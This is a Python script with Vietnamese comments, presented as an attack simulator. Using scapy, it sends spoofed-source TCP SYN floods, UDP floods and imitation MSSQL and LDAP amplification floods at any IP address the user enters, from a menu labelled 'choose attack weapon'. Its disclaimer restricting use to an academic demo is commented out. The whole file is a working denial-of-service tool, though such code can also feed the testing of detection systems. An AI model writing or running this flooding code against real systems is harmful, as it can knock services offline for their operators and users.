import time
import random
import sys
from scapy.all import send, Raw
from scapy.layers.inet import IP, TCP, UDP
from colorama import init, Fore, Style

# Khởi tạo màu sắc Terminal
init(autoreset=True)

print(Fore.RED + Style.BRIGHT + "=" * 65)
print(Fore.RED + Style.BRIGHT + " HỆ THỐNG GIẢ LẬP TẤN CÔNG (PENTEST ENGINE)")
print(Fore.RED + Style.BRIGHT + "=" * 65)
#print(Fore.YELLOW + "CẢNH BÁO: Kịch bản này chỉ dành cho mục đích demo đồ án học thuật.")
#print(Fore.YELLOW + "Tuyệt đối không sử dụng trên các hệ thống mạng trái phép!\n")

# ==========================================
# CẤU HÌNH MỤC TIÊU
# ==========================================
TARGET_IP = input(Fore.CYAN + "[?] Nhập IP Mục tiêu (VD: 127.0.0.1 hoặc IP máy ảo): ").strip()
if not TARGET_IP:
    TARGET_IP = "127.0.0.1"

TARGET_PORT = 80
PACKET_COUNT = 1000  # Số lượng gói tin mỗi đợt bắn


# ==========================================
# CÁC KỊCH BẢN TẤN CÔNG (PAYLOAD CRAFTING)
# ==========================================

def syn_flood(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa SYN FLOOD vào {target_ip}...")
    for i in range(count):
        # Tạo IP giả ngẫu nhiên (Spoofing) để hệ thống nhận diện nhiều Source IP
        src_ip = f"10.0.0.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        # Gói tin TCP với cờ 'S' (SYN)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=TARGET_PORT, flags="S")

        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói SYN...")


def udp_flood(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa UDP FLOOD vào {target_ip}...")
    for i in range(count):
        src_ip = f"172.16.0.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        # Gói UDP với payload nhỏ ngẫu nhiên (để tạo variance)
        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=src_port, dport=TARGET_PORT)
        payload = Raw(b"X" * random.randint(64, 128))

        packet = ip_layer / udp_layer / payload
        send(packet, verbose=False)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói UDP...")


def mssql_amplification(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa MSSQL AMPLIFICATION vào {target_ip}...")
    for i in range(count):
        src_ip = f"192.168.1.{random.randint(1, 100)}"
        # Tấn công khuếch đại MSSQL dùng cổng UDP 1434 và Payload lớn
        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=1434, dport=random.randint(1024, 65535))
        # Payload mô phỏng phản hồi khuếch đại (Kích thước lớn 800 - 1200 bytes)
        payload = Raw(b"M" * random.randint(800, 1200))

        packet = ip_layer / udp_layer / payload
        send(packet, verbose=False)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói MSSQL Amplification...")


def ldap_amplification(target_ip, count):
    print(Fore.RED + f"\n[*] Khai hỏa LDAP AMPLIFICATION vào {target_ip}...")
    for i in range(count):
        src_ip = f"11.0.0.{random.randint(1, 200)}"
        # Tấn công khuếch đại LDAP dùng cổng UDP 389 và Payload cực lớn
        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=389, dport=random.randint(1024, 65535))
        # Payload mô phỏng phản hồi LDAP (Kích thước bạo chúa 1400 - 2000 bytes)
        payload = Raw(b"L" * random.randint(1400, 2000))

        packet = ip_layer / udp_layer / payload
        send(packet, verbose=False)
        if i % 100 == 0:
            print(f"  -> Đã gửi {i} gói LDAP Amplification...")


# ==========================================
# BẢNG ĐIỀU KHIỂN TẤN CÔNG
# ==========================================
while True:
    print(Fore.CYAN + "\nCHỌN VŨ KHÍ TẤN CÔNG:")
    print("  [1] TCP SYN Flood (DDoS Tầng Giao vận)")
    print("  [2] UDP Flood (DDoS Cạn kiệt băng thông)")
    print("  [3] MSSQL Amplification (Khuếch đại - Mức độ CAO)")
    print("  [4] LDAP Amplification (Khuếch đại - Mức độ CAO)")
    print("  [0] Thoát")

    choice = input(Fore.YELLOW + "Nhập lệnh (0-4): ").strip()

    if choice == '1':
        syn_flood(TARGET_IP, PACKET_COUNT)
    elif choice == '2':
        udp_flood(TARGET_IP, PACKET_COUNT)
    elif choice == '3':
        mssql_amplification(TARGET_IP, PACKET_COUNT)
    elif choice == '4':
        ldap_amplification(TARGET_IP, PACKET_COUNT)
    elif choice == '0':
        print(Fore.GREEN + "[-] Dừng máy tấn công. Rời khỏi hệ thống.")
        sys.exit(0)
    else:
        print(Fore.RED + "[!] Lựa chọn không hợp lệ.")